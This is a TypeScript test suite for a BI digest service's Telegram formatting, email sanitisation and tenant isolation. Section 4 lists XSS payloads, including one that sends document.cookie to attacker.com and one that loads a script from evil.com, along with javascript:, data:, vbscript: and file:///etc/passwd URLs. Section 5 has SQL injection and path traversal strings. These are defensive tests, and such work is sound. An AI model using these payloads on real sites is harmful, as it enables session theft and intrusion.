/**
 * Adversarial Stress Test Suite: Executive BI Telegram Formatting & Tenant Isolation
 *
 * Attacks and Stress-Tests:
 * 1. Telegram MarkdownV2 Escaping: Fuzzing all 18 reserved characters + backslash, permutations, and roundtrip integrity.
 * 2. Boundary Text Length Chunking: 4095, 4096, 4097, 8192, and extreme continuous monolithic payloads.
 * 3. Split Severing Resistance: Trailing backslash escape guard and UTF-16 surrogate pair (emoji) integrity.
 * 4. HTML Email White-Label Sanitization: XSS, script injection, attribute breakouts, pseudo-protocols, regex injection.
 * 5. Tenant Isolation Attacks in Export API: Direct assertTenantScope fuzzing, GET/POST cross-tenant blocking, and in-database leakage verification.
 *
 * @module __tests__/integration/enterprise/bi-digests-stress.test
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { NextRequest } from 'next/server';
import { createRequire } from 'node:module';

// Hoist mocks for Next.js API Route testing
const { mockGetCurrentUser, mockResolveOrgId, mockGetD1 } = vi.hoisted(() => ({
  mockGetCurrentUser: vi.fn(),
  mockResolveOrgId: vi.fn(),
  mockGetD1: vi.fn(),
}));

vi.mock('@/seed/auth/better-auth-session', () => ({
  getCurrentUser: mockGetCurrentUser,
}));

vi.mock('@/seed/auth/resolve-org-id', () => ({
  resolveOrgId: mockResolveOrgId,
}));

vi.mock('@/seed/db/client', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/seed/db/client')>();
  return {
    ...actual,
    getD1: mockGetD1,
  };
});

import {
  escapeTelegramMarkdownV2,
  splitTelegramMarkdownV2,
  formatTelegramDigest,
  TELEGRAM_MARKDOWN_V2_SPECIALS,
} from '@/forest/bi/telegram-digest-sender';

import {
  wrapWithAgencyBranding,
  formatWhiteLabelEmail,
  escapeHtml,
  isValidHttpUrl,
  type WhiteLabelEmailBranding,
} from '@/tree/branding/email-styler';

import {
  renderExecutiveDigestInnerHtml,
  formatEmailDigest,
} from '@/forest/bi/email-digest-sender';

import {
  assertTenantScope,
  assertResourceScope,
  filterByTenant,
  CrossTenantViolationError,
} from '@/forest/tenant/isolation-guard';

import { GET, POST } from '@/app/api/v1/analytics/export/route';
import { makeD1 } from '@/__tests__/integration/shared-d1-shim';
import type { ExecutiveBIMetricsSummary } from '@/seed/types/executive-bi';
import type { BrandingSettings } from '@/seed/tenant-settings/defaults';

const req = createRequire(import.meta.url);
const { DatabaseSync } = req('node:sqlite') as {
  DatabaseSync: new (path: string) => {
    exec(sql: string): void;
    prepare(sql: string): {
      get(...params: unknown[]): unknown;
      all(...params: unknown[]): unknown[];
      run(...params: unknown[]): { lastInsertRowid: bigint; changes: number };
    };
  };
};

describe('Adversarial Stress Suite: BI Digests & Cross-Tenant Isolation', () => {
  // All 18 Telegram MarkdownV2 reserved characters + backslash escape character
  const ALL_18_MARKDOWN_V2_SPECIALS = [
    '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!',
  ];

  const sampleMetrics: ExecutiveBIMetricsSummary = {
    orgId: 'org_adversarial_bi',
    periodStart: 1717200000000,
    periodEnd: 1719791999000,
    mrrCents: 876543,
    throughputCount: 234,
    viralScore: 92.4,
    affiliateRevenueCents: 1543200,
    marketingSpendCents: 432100,
    roiRatio: 3.57,
  };

  // ============================================================================
  // 1. TELEGRAM MARKDOWNV2 CHARACTER FUZZING & ESCAPING
  // ============================================================================
  describe('1. Telegram MarkdownV2 Reserved Characters Fuzzing & Escaping', () => {
    it('fuzzes each of the 18 reserved characters individually', () => {
      expect(ALL_18_MARKDOWN_V2_SPECIALS).toHaveLength(18);

      for (const char of ALL_18_MARKDOWN_V2_SPECIALS) {
        const escaped = escapeTelegramMarkdownV2(char);
        expect(escaped).toBe(`\\${char}`);
      }
    });

    it('escapes literal backslash \\ to \\\\', () => {
      expect(escapeTelegramMarkdownV2('\\')).toBe('\\\\');
    });

    it('escapes an entire concatenated string of all 18 reserved characters plus backslash', () => {
      const allChars = ALL_18_MARKDOWN_V2_SPECIALS.join('') + '\\';
      const escaped = escapeTelegramMarkdownV2(allChars);

      const expected = ALL_18_MARKDOWN_V2_SPECIALS.map((c) => `\\${c}`).join('') + '\\\\';
      expect(escaped).toBe(expected);
      expect(escaped.length).toBe((18 + 1) * 2);
    });

    it('fuzzes 100 randomized strings with arbitrary combinations of specials and alphanumerics', () => {
      const pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ' +
        ALL_18_MARKDOWN_V2_SPECIALS.join('') + '\\';

      for (let run = 0; run < 100; run++) {
        const len = 50 + Math.floor(Math.random() * 150);
        let raw = '';
        for (let j = 0; j < len; j++) {
          raw += pool[Math.floor(Math.random() * pool.length)];
        }

        const escaped = escapeTelegramMarkdownV2(raw);

        // Verification 1: Unescaping restores EXACT original input string (lossless bijectivity)
        const unescaped = escaped.replace(/\\([_*[\]()~`>#+\-=|{}.!\\])/g, '$1');
        expect(unescaped).toBe(raw);

        // Verification 2: Every special character in escaped text is preceded by a backslash
        for (let i = 0; i < escaped.length; i++) {
          const ch = escaped[i];
          if (ALL_18_MARKDOWN_V2_SPECIALS.includes(ch)) {
            // Must have a preceding backslash
            expect(i).toBeGreaterThan(0);
            expect(escaped[i - 1]).toBe('\\');
          }
        }
      }
    });

    it('neutralizes MarkdownV2 injection inside agency branding and dynamic KPI strings', () => {
      const hostileAgency =
        'Evil Corp *Bold* _Italic_ ~Strike~ [Link](http://evil.com) `code` >quote #1 + - = | {test} . ! \\';

      const digest = formatTelegramDigest(sampleMetrics, { agencyName: hostileAgency });

      // No unescaped markdown tokens should exist in output
      expect(digest).toContain('Evil Corp \\*Bold\\* \\_Italic\\_');
      expect(digest).toContain('\\[Link\\]\\(http://evil\\.com\\)');
      expect(digest).toContain('\\`code\\`');
      expect(digest).toContain('\\>quote');
      expect(digest).toContain('\\#1');
      expect(digest).toContain('\\+');
      expect(digest).toContain('\\-');
      expect(digest).toContain('\\=');
      expect(digest).toContain('\\|');
      expect(digest).toContain('\\{test\\}');
      expect(digest).toContain('\\.');
      expect(digest).toContain('\\!');
      expect(digest).toContain('\\\\');
    });

    it('handles consecutive and heavily clustered reserved characters', () => {
      const clustered = '****[[[[((((~~~~````>>>>####++++----====||||{{{{}}}}....!!!!\\\\\\\\';
      const escaped = escapeTelegramMarkdownV2(clustered);

      expect(escaped.length).toBe(clustered.length * 2);
      expect(escaped.replace(/\\([_*[\]()~`>#+\-=|{}.!\\])/g, '$1')).toBe(clustered);
    });
  });

  // ============================================================================
  // 2. BOUNDARY TEXT LENGTH CHUNKING (4095, 4096, 4097, 8192)
  // ============================================================================
  describe('2. Boundary Text Length Chunking (4095, 4096, 4097, 8192 chars)', () => {
    it('returns exactly 1 chunk when text length is 4095 characters', () => {
      const text4095 = 'A'.repeat(4095);
      const chunks = splitTelegramMarkdownV2(text4095, 4096);

      expect(chunks).toHaveLength(1);
      expect(chunks[0].length).toBe(4095);
      expect(chunks[0]).toBe(text4095);
    });

    it('returns exactly 1 chunk when text length is exactly 4096 characters', () => {
      const text4096 = 'B'.repeat(4096);
      const chunks = splitTelegramMarkdownV2(text4096, 4096);

      expect(chunks).toHaveLength(1);
      expect(chunks[0].length).toBe(4096);
      expect(chunks[0]).toBe(text4096);
    });

    it('splits cleanly into 2 chunks when text length is 4097 characters (boundary overflow)', () => {
      const text4097 = 'C'.repeat(4097);
      const chunks = splitTelegramMarkdownV2(text4097, 4096);

      expect(chunks).toHaveLength(2);
      expect(chunks[0].length).toBeLessThanOrEqual(4096);
      expect(chunks[1].length).toBeLessThanOrEqual(4096);
      expect(chunks[0].length + chunks[1].length).toBe(4097);
      expect(chunks.join('')).toBe(text4097);
    });

    it('handles exactly 8192 characters (2x 4096) with zero lost characters', () => {
      const text8192 = 'D'.repeat(8192);
      const chunks = splitTelegramMarkdownV2(text8192, 4096);

      expect(chunks.length).toBeGreaterThanOrEqual(2);
      for (const chunk of chunks) {
        expect(chunk.length).toBeLessThanOrEqual(4096);
      }
      expect(chunks.join('')).toBe(text8192);
    });

    it('splits massive monolithic continuous text (10,000 characters without whitespace) safely', () => {
      const monolithic = 'X'.repeat(10000);
      const chunks = splitTelegramMarkdownV2(monolithic, 4096);

      expect(chunks.length).toBe(3); // 4096 + 4096 + 1808
      expect(chunks[0].length).toBe(4096);
      expect(chunks[1].length).toBe(4096);
      expect(chunks[2].length).toBe(1808);
      expect(chunks.join('')).toBe(monolithic);
    });

    it('prefers natural paragraph and sentence boundaries when available', () => {
      const p1 = 'Paragraph 1 '.repeat(100).trim(); // ~1200 chars
      const p2 = 'Paragraph 2 '.repeat(150).trim(); // ~1800 chars
      const p3 = 'Paragraph 3 '.repeat(150).trim(); // ~1800 chars
      const fullText = `${p1}\n\n${p2}\n\n${p3}`; // ~4800 chars total

      const chunks = splitTelegramMarkdownV2(fullText, 4096);
      expect(chunks.length).toBe(2);
      expect(chunks[0].length).toBeLessThanOrEqual(4096);
      expect(chunks[1].length).toBeLessThanOrEqual(4096);
      expect(chunks[0].endsWith('\n\n')).toBe(false);
      expect(chunks[0]).toContain(p1);
    });
  });

  // ============================================================================
  // 3. SPLIT SEVERING RESISTANCE: ESCAPE BACKSLASHES & SURROGATE PAIRS
  // ============================================================================
  describe('3. Split Severing Resistance: Escape Backslashes & Surrogate Pairs', () => {
    it('prevents severing a single escape backslash at index 4095 escaping dot at 4096', () => {
      // 4095 'A' chars, then '\.' (1 backslash + 1 dot), then 'B' chars.
      // Index 4095 is '\', index 4096 is '.'.
      const prefix = 'A'.repeat(4095);
      const suffix = 'B'.repeat(50);
      const text = prefix + '\\.' + suffix;

      const chunks = splitTelegramMarkdownV2(text, 4096);

      expect(chunks.length).toBe(2);
      // Chunk 0 must NOT end with an odd trailing backslash '\'
      expect(chunks[0].endsWith('\\')).toBe(false);
      expect(chunks[0]).toBe(prefix); // cutIndex pulled back to 4095

      // Chunk 1 must receive the intact escape sequence '\.'
      expect(chunks[1].startsWith('\\.')).toBe(true);
      expect(chunks[0].length).toBeLessThanOrEqual(4096);
      expect(chunks[1].length).toBeLessThanOrEqual(4096);
    });

    it('permits cutting after an even number of backslashes (literal escaped backslash)', () => {
      // 4094 'A' chars, followed by 2 backslashes at 4094-4095, followed by 'C' at 4096.
      // '\\' is an escaped literal backslash, so cutting after index 4095 is safe.
      const prefix = 'A'.repeat(4094);
      const text = prefix + '\\'.repeat(2) + 'C' + 'D'.repeat(50);

      const chunks = splitTelegramMarkdownV2(text, 4096);

      expect(chunks.length).toBe(2);
      // Chunk 0 contains both backslashes (even count = valid literal backslash)
      expect(chunks[0].endsWith('\\'.repeat(2))).toBe(true);
      expect(chunks[0].length).toBe(4096);
      expect(chunks[1].startsWith('C')).toBe(true);
    });

    it('handles odd backslashes correctly: 3 backslashes across cut boundary', () => {
      // 4093 'A' chars, followed by 3 backslashes + dot.
      // Indices 4093, 4094, 4095 are '\'. Index 4096 is '.'.
      const prefix = 'A'.repeat(4093);
      const text = prefix + '\\'.repeat(3) + '.' + 'E'.repeat(50);

      const chunks = splitTelegramMarkdownV2(text, 4096);

      expect(chunks.length).toBe(2);
      // Chunk 0 must pull back 1 so it ends with 2 backslashes (even, valid)
      expect(chunks[0].endsWith('\\'.repeat(2))).toBe(true);
      expect(chunks[0].length).toBe(4095);
      // Chunk 1 starts with the remaining backslash escaping the dot: '\.'
      expect(chunks[1].startsWith('\\.')).toBe(true);
    });

    it('prevents severing UTF-16 surrogate pairs (emoji) sitting across index 4095-4096', () => {
      // Rocket emoji 🚀 is 2 code units: \uD83D (high surrogate) and \uDE80 (low surrogate)
      const rocket = '🚀';
      expect(rocket.length).toBe(2);
      const highSurrogate = rocket.charCodeAt(0);
      const lowSurrogate = rocket.charCodeAt(1);
      expect(highSurrogate).toBeGreaterThanOrEqual(0xd800);
      expect(highSurrogate).toBeLessThanOrEqual(0xdbff);
      expect(lowSurrogate).toBeGreaterThanOrEqual(0xdc00);
      expect(lowSurrogate).toBeLessThanOrEqual(0xdfff);

      // Place high surrogate at index 4095 and low surrogate at index 4096
      const prefix = 'A'.repeat(4095);
      const text = `${prefix}${rocket}${'B'.repeat(50)}`;

      const chunks = splitTelegramMarkdownV2(text, 4096);

      expect(chunks.length).toBe(2);
      // Chunk 0 must NOT contain the orphan high surrogate
      const lastCodeUnit = chunks[0].charCodeAt(chunks[0].length - 1);
      expect(lastCodeUnit).not.toBe(highSurrogate);
      expect(chunks[0].length).toBe(4095);
      expect(chunks[0]).toBe(prefix);

      // Chunk 1 must start with the intact, unbroken emoji
      expect(chunks[1].startsWith('🚀')).toBe(true);
      expect(chunks[1].charCodeAt(0)).toBe(highSurrogate);
      expect(chunks[1].charCodeAt(1)).toBe(lowSurrogate);
    });

    it('protects diverse emojis (🔥, 📊, 💎, 🦄) positioned exactly at the boundary', () => {
      const emojis = ['🔥', '📊', '💎', '🦄'];
      for (const emoji of emojis) {
        const prefix = 'Z'.repeat(4095);
        const text = `${prefix}${emoji}Payload`;
        const chunks = splitTelegramMarkdownV2(text, 4096);

        expect(chunks[0]).toBe(prefix);
        expect(chunks[1].startsWith(emoji)).toBe(true);
        expect(chunks[0].length).toBeLessThanOrEqual(4096);
        expect(chunks[1].length).toBeLessThanOrEqual(4096);
      }
    });

    it('handles combined hazard: escape backslash followed immediately by an emoji near boundary', () => {
      // 4094 chars, '\!' (2 chars), then emoji '🔥'
      const prefix = 'W'.repeat(4094);
      const text = prefix + '\\!' + '🔥' + 'K'.repeat(50);
      const chunks = splitTelegramMarkdownV2(text, 4096);

      expect(chunks.length).toBe(2);
      // '\!' fits in chunk 0 (4094 + 2 = 4096)
      expect(chunks[0].endsWith('\\!')).toBe(true);
      expect(chunks[0].length).toBe(4096);
      // '🔥' starts chunk 1 intact
      expect(chunks[1].startsWith('🔥')).toBe(true);
    });
  });

  // ============================================================================
  // 4. HTML EMAIL WHITE-LABEL SANITIZATION & SCRIPT INJECTION
  // ============================================================================
  describe('4. HTML Email White-Label Sanitization & Script Injection Attacks', () => {
    const maliciousPayloads = [
      '<script>alert("XSS")</script>',
      '<script src="//evil.com/leak.js"></script>',
      '<img src=x onerror="fetch(\'http://attacker.com/\'+document.cookie)">',
      '<svg/onload="alert(document.domain)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
    ];

    it('sanitizes script injection payloads in agencyName inside email header', () => {
      for (const payload of maliciousPayloads) {
        const branding: Partial<BrandingSettings> = {
          agencyName: `Apex Agency ${payload}`,
        };
        const email = wrapWithAgencyBranding('<p>Safe Content</p>', branding);

        // Script tags must never appear raw in rendered HTML
        expect(email).not.toContain('<script>');
        expect(email).not.toContain('</script>');
        expect(email).not.toContain('<img src=x');
        expect(email).not.toContain('<svg/onload');
        expect(email).not.toContain('<iframe');

        // Escaped entity versions must be present
        expect(email).toContain('&lt;');
        expect(email).toContain('&gt;');
      }
    });

    it('prevents attribute breakout in logoUrl', () => {
      const breakoutLogo = 'https://agency.com/logo.png" onerror="alert(1)" style="';
      const branding: Partial<BrandingSettings> = {
        logoUrl: breakoutLogo,
        agencyName: 'Safe Agency',
      };

      const email = wrapWithAgencyBranding('<p>Content</p>', branding);

      // Quote characters must be escaped so attribute injection fails
      expect(email).not.toContain('onerror="alert(1)"');
      expect(email).toContain('&quot;');
    });

    it('sanitizes script injection in legalDisclaimer and emailFooter via formatWhiteLabelEmail', () => {
      const branding: WhiteLabelEmailBranding = {
        agencyName: 'Safe Agency',
        legalDisclaimer: '<script>stealCredentials()</script> Registered in Delaware.',
        emailFooter: '<img src="x" onerror="evil()">',
      };

      const email = formatWhiteLabelEmail('<p>Content</p>', branding);

      expect(email).not.toContain('<script>stealCredentials()</script>');
      expect(email).toContain('&lt;script&gt;stealCredentials()&lt;/script&gt;');
      expect(email).not.toContain('<img src="x" onerror="evil()">');
    });

    it('sanitizes supportEmail against mailto attribute breakouts in formatWhiteLabelEmail', () => {
      const branding: WhiteLabelEmailBranding = {
        agencyName: 'Agency Inc',
        supportEmail: 'ceo@agency.com"><script>alert("support_xss")</script>',
      };

      const email = formatWhiteLabelEmail('<p>Content</p>', branding);

      expect(email).not.toContain('<script>alert("support_xss")</script>');
      expect(email).toContain('&quot;&gt;&lt;script&gt;');
    });

    it('strictly validates and rejects malicious pseudo-protocols in unsubscribeUrl', () => {
      const maliciousUrls = [
        'javascript:alert(1)',
        'JAVASCRIPT:alert(document.cookie)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'file:///etc/passwd',
        '//evil.com/phishing',
      ];

      for (const badUrl of maliciousUrls) {
        expect(isValidHttpUrl(badUrl)).toBe(false);

        const branding: WhiteLabelEmailBranding = {
          agencyName: 'Test Agency',
          unsubscribeUrl: badUrl,
        };
        const email = formatWhiteLabelEmail('<p>Content</p>', branding);
        expect(email).not.toContain(badUrl);
      }

      // Valid HTTP/HTTPS URLs must be accepted
      expect(isValidHttpUrl('https://agency.com/unsubscribe?token=safe')).toBe(true);
      expect(isValidHttpUrl('http://agency.com/unsubscribe?token=safe')).toBe(true);
    });

    it('handles regex special replacement tokens ($&, $1, $\', $`) in branding without corruption', () => {
      const branding: Partial<BrandingSettings> = {
        agencyName: 'Agency $& Special $1 Token $\'',
        emailFooter: 'Footer with $& and $1',
      };

      const email = wrapWithAgencyBranding('<html><body><p>Body</p></body></html>', branding);

      // Must not corrupt document structure or produce duplicate matches
      expect(email).toContain('Agency $&amp; Special $1 Token');
      expect(email).toContain('</body>');
    });

    it('sanitizes complete Executive Email Digest via formatEmailDigest', () => {
      const hostileBranding: WhiteLabelEmailBranding = {
        agencyName: '<script>alert("executive_bi")</script> Agency',
        primaryColor: '#6366f1',
        legalDisclaimer: '<svg onload=alert(1)>',
      };

      const email = formatEmailDigest(sampleMetrics, hostileBranding);

      expect(email).not.toContain('<script>alert("executive_bi")</script>');
      expect(email).not.toContain('<svg onload=alert(1)>');
      expect(email).toContain('Monthly Recurring Revenue');
      expect(email).toContain('8765.43');
      expect(email).toContain('234 videos');
    });
  });

  // ============================================================================
  // 5. TENANT ISOLATION ATTACKS IN EXPORT API & ASSERT_TENANT_SCOPE
  // ============================================================================
  describe('5. Tenant Isolation Attacks in Export API & assertTenantScope', () => {
    describe('5.1 Direct assertTenantScope Fuzzing & Stress', () => {
      it('assertTenantScope allows matching contexts', () => {
        expect(() => assertTenantScope('org_tenant_1', 'org_tenant_1')).not.toThrow();
        expect(() => assertTenantScope('org_alpha_prod', 'org_alpha_prod')).not.toThrow();
      });

      it('assertTenantScope throws 403 CrossTenantViolationError on mismatch', () => {
        expect(() => assertTenantScope('org_tenant_1', 'org_tenant_2')).toThrow(
          CrossTenantViolationError,
        );

        try {
          assertTenantScope('org_tenant_1', 'org_tenant_2');
        } catch (err) {
          expect(err).toBeInstanceOf(CrossTenantViolationError);
          const violation = err as CrossTenantViolationError;
          expect(violation.code).toBe('CROSS_TENANT_VIOLATION');
          expect(violation.status).toBe(403);
          expect(violation.currentOrgId).toBe('org_tenant_1');
          expect(violation.resourceOrgId).toBe('org_tenant_2');
        }
      });

      it('assertTenantScope throws on empty, null, undefined, or whitespace-only org IDs', () => {
        const invalidPairs: [string | null | undefined, string | null | undefined][] = [
          ['', 'org_1'],
          ['org_1', ''],
          [null, 'org_1'],
          ['org_1', null],
          [undefined, 'org_1'],
          ['org_1', undefined],
          ['   ', 'org_1'],
          ['org_1', '   '],
          ['', ''],
          [null, null],
          [undefined, undefined],
        ];

        for (const [curr, target] of invalidPairs) {
          expect(() => assertTenantScope(curr, target)).toThrow(CrossTenantViolationError);
        }
      });

      it('assertTenantScope rejects substring and prefix confusion attacks', () => {
        expect(() => assertTenantScope('org_alpha', 'org_alpha_beta')).toThrow(
          CrossTenantViolationError,
        );
        expect(() => assertTenantScope('org_1', 'org_10')).toThrow(CrossTenantViolationError);
        expect(() => assertTenantScope('org_enterprise', 'enterprise')).toThrow(
          CrossTenantViolationError,
        );
      });

      it('assertTenantScope enforces strict case sensitivity', () => {
        expect(() => assertTenantScope('ORG_ALPHA', 'org_alpha')).toThrow(
          CrossTenantViolationError,
        );
      });

      it('assertTenantScope rejects directory traversal / path injection in orgId', () => {
        expect(() => assertTenantScope('org_alpha/../org_beta', 'org_beta')).toThrow(
          CrossTenantViolationError,
        );
      });

      it('assertTenantScope rejects SQL injection payloads in orgId', () => {
        expect(() => assertTenantScope("org_alpha' OR '1'='1", 'org_alpha')).toThrow(
          CrossTenantViolationError,
        );
      });

      it('assertResourceScope throws on mismatched resource or null resource', () => {
        expect(() => assertResourceScope('org_alpha', null)).toThrow(CrossTenantViolationError);
        expect(() =>
          assertResourceScope('org_alpha', { org_id: 'org_beta', data: 123 }),
        ).toThrow(CrossTenantViolationError);
        expect(() =>
          assertResourceScope('org_alpha', { orgId: 'org_beta', data: 123 }),
        ).toThrow(CrossTenantViolationError);

        // Valid resource passes
        expect(() =>
          assertResourceScope('org_alpha', { org_id: 'org_alpha', data: 123 }),
        ).not.toThrow();
      });

      it('filterByTenant strictly prevents cross-tenant data leakage', () => {
        const dataset = [
          { id: '1', org_id: 'org_tenant_A', value: 100 },
          { id: '2', org_id: 'org_tenant_B', value: 200 },
          { id: '3', org_id: 'org_tenant_A', value: 300 },
          { id: '4', org_id: 'org_tenant_C', value: 400 },
        ];

        const filteredA = filterByTenant(dataset, 'org_tenant_A');
        expect(filteredA).toHaveLength(2);
        expect(filteredA.map((d) => d.id)).toEqual(['1', '3']);

        const filteredB = filterByTenant(dataset, 'org_tenant_B');
        expect(filteredB).toHaveLength(1);
        expect(filteredB[0].id).toBe('2');

        const filteredEmpty = filterByTenant(dataset, '');
        expect(filteredEmpty).toHaveLength(0);
      });
    });

    describe('5.2 Export API Endpoint Isolation Attacks (/api/v1/analytics/export)', () => {
      let rawDb: InstanceType<typeof DatabaseSync>;
      let db: ReturnType<typeof makeD1>;
      const userCallerId = 'usr_tenant_attacker';
      const userCallerOrgId = 'org_victim_caller';
      const competitorOrgId = 'org_competitor_target';

      beforeEach(() => {
        vi.clearAllMocks();

        rawDb = new DatabaseSync(':memory:');
        rawDb.exec(`
          CREATE TABLE IF NOT EXISTS executive_bi_metrics (
            id TEXT PRIMARY KEY,
            org_id TEXT NOT NULL,
            period_start INTEGER NOT NULL,
            period_end INTEGER NOT NULL,
            mrr_cents INTEGER NOT NULL DEFAULT 0,
            throughput_count INTEGER NOT NULL DEFAULT 0,
            viral_score REAL NOT NULL DEFAULT 0,
            affiliate_revenue_cents INTEGER NOT NULL DEFAULT 0,
            marketing_spend_cents INTEGER NOT NULL DEFAULT 0,
            channel TEXT DEFAULT NULL,
            created_at INTEGER NOT NULL
          );

          -- Seed Competitor sensitive metrics ($1,000,000 MRR)
          INSERT INTO executive_bi_metrics
          VALUES ('bi_comp_1', '${competitorOrgId}', 1700000000000, 1702592000000, 100000000, 500, 98.5, 200000000, 50000000, 'tiktok', 1700000000000);

          -- Seed Caller metrics ($5,000 MRR)
          INSERT INTO executive_bi_metrics
          VALUES ('bi_caller_1', '${userCallerOrgId}', 1700000000000, 1702592000000, 500000, 25, 75.0, 800000, 200000, 'shorts', 1700000000000);
        `);
        db = makeD1(rawDb);

        mockGetCurrentUser.mockResolvedValue({
          id: userCallerId,
          email: 'attacker@org.com',
          role: 'admin',
        });
        mockResolveOrgId.mockResolvedValue(userCallerOrgId);
        mockGetD1.mockResolvedValue(db);
      });

      it('blocks GET cross-tenant export attack via query parameter with HTTP 403', async () => {
        const req = new NextRequest(
          `https://sophia.agencyos.network/api/v1/analytics/export?org_id=${competitorOrgId}&format=csv`,
        );
        const res = await GET(req);

        expect(res.status).toBe(403);
        const data = (await res.json()) as { error?: string; code?: string };
        expect(data.error).toBe('CROSS_TENANT_VIOLATION');
        expect(data.code).toBe('CROSS_TENANT_VIOLATION');
      });

      it('blocks POST cross-tenant export attack via request body with HTTP 403', async () => {
        const req = new NextRequest('https://sophia.agencyos.network/api/v1/analytics/export', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            orgId: competitorOrgId,
            format: 'json',
          }),
        });
        const res = await POST(req);

        expect(res.status).toBe(403);
        const data = (await res.json()) as { error?: string };
        expect(data.error).toBe('CROSS_TENANT_VIOLATION');
      });

      it('blocks directory traversal attempt in orgId query parameter with HTTP 403', async () => {
        const req = new NextRequest(
          `https://sophia.agencyos.network/api/v1/analytics/export?org_id=${userCallerOrgId}/../${competitorOrgId}`,
        );
        const res = await GET(req);

        expect(res.status).toBe(403);
        const data = (await res.json()) as { error?: string };
        expect(data.error).toBe('CROSS_TENANT_VIOLATION');
      });

      it('blocks unauthenticated export requests with HTTP 401 UNAUTHORIZED', async () => {
        mockGetCurrentUser.mockResolvedValue(null);

        const req = new NextRequest('https://sophia.agencyos.network/api/v1/analytics/export');
        const res = await GET(req);

        expect(res.status).toBe(401);
        const data = (await res.json()) as { error?: string };
        expect(data.error).toBe('UNAUTHORIZED');
      });

      it('blocks users without active organization with HTTP 403 FORBIDDEN', async () => {
        mockResolveOrgId.mockResolvedValue(null);

        const req = new NextRequest('https://sophia.agencyos.network/api/v1/analytics/export');
        const res = await GET(req);

        expect(res.status).toBe(403);
        const data = (await res.json()) as { error?: string };
        expect(data.error).toBe('FORBIDDEN');
      });

      it('guarantees ZERO competitor data leakage in legitimate export streaming response', async () => {
        // Caller requests export of their own organization's data
        const req = new NextRequest(
          `https://sophia.agencyos.network/api/v1/analytics/export?format=csv&start=1690000000000&end=1710000000000`,
        );
        const res = await GET(req);

        expect(res.status).toBe(200);
        expect(res.headers.get('Content-Type')).toContain('text/csv');

        // Read the entire streamed body
        const streamReader = res.body?.getReader();
        expect(streamReader).toBeDefined();

        let csvText = '';
        const decoder = new TextDecoder();
        while (true) {
          const { done, value } = await streamReader!.read();
          if (done) break;
          csvText += decoder.decode(value, { stream: true });
        }
        csvText += decoder.decode();

        // INVARIANT 1: Must contain caller's org and metric
        expect(csvText).toContain(userCallerOrgId);
        expect(csvText).toContain('bi_caller_1');

        // INVARIANT 2: Strict zero leakage: competitor org ID, competitor record ID,
        // and competitor financial amounts ($1,000,000.00 / 100000000) MUST NEVER appear.
        expect(csvText).not.toContain(competitorOrgId);
        expect(csvText).not.toContain('bi_comp_1');
        expect(csvText).not.toContain('1000000.00');
        expect(csvText).not.toContain('2000000.00');
      });
    });
  });
});
